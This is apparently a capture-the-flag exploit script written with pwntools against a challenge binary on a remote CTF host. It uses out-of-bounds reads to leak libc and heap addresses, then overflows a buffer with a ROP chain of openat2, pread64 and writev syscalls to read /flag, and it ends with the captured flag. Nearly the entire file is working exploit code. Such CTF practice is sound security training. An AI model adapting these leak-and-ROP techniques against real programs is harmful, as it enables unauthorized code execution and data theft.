from pwn import *



def add(name):
    p.sendlineafter(">","1")
    p.sendlineafter(":",name)
def show():
    p.sendlineafter(">","2")
def remove(idx):
    p.sendlineafter(">","3")
    p.sendlineafter(":",str(idx))
def view(idx):
    p.sendlineafter(">","4")
    p.sendlineafter(":",str(idx))
def submit():
    p.sendlineafter(">","5")



elf = context.binary = ELF("chall")
libc = ELF("libc/libc.so.6")
env = {}
env["LD_LIBRARY_PATH"] = "./libc"
# p = process(env=env)
# p = remote("localhost" , 1337)
p = remote("pwn1.blitzhack.xyz" , 1337)



# fill heap with usefull strings
p.sendline(b"#" * 8)
p.sendline(b"@" * 8)

add("PWNING1337")
add(b"/flag\x00".ljust(0x20,b"1"))
add("2" * 0x800)
add("3" * 0x1200)


# out of bounds read to leak libc
view(0x130)
p.recvuntil("Data: ")
libc_leak = u64(p.recvline().strip().ljust(8,b"\x00"))
libc_leak = libc_leak - 0x3ec2a0
libc.address = libc_leak 
print("libc.address",hex(libc_leak))

# out of bounds read to leak heap
view(-9)
p.recvuntil("Data: ")
heap_leak = u64(p.recvline().strip().ljust(8,b"\x00"))
heap_leak = heap_leak
print("heap_leak",hex(heap_leak))


# add struck so i can use it later with writev
add(b"Look her" + p64(heap_leak - 0x320) + p64(0x80))
print("data at",hex(heap_leak + 0x320))



# simple rop
syscall = libc.address + 0x13ff57
submit()
rop = ROP(libc)

p.sendline(p8(0) + cyclic(1079) + flat([
    # openat2
    rop.rdi.address, -100,
    rop.rsi.address, heap_leak - 0xe0,
    rop.r10.address, 24,
    rop.rdx.address, heap_leak - 0x320,
    rop.rax.address, 437,
    syscall,

    # pread64
    rop.rdi.address, 5,
    rop.rsi.address, heap_leak - 0x320,
    rop.rdx.address, 0x80,
    rop.r10.address, 0,
    rop.rax.address, 17,
    syscall,

    # writev
    rop.rdi.address, 1,
    rop.rdx.address, 1,
    rop.rsi.address, heap_leak + 0x1af8,
    rop.rax.address, 20,
    syscall,

]))

p.interactive()

# Blitz{sup3r_r0p_r0p_r0p_368e514668d61}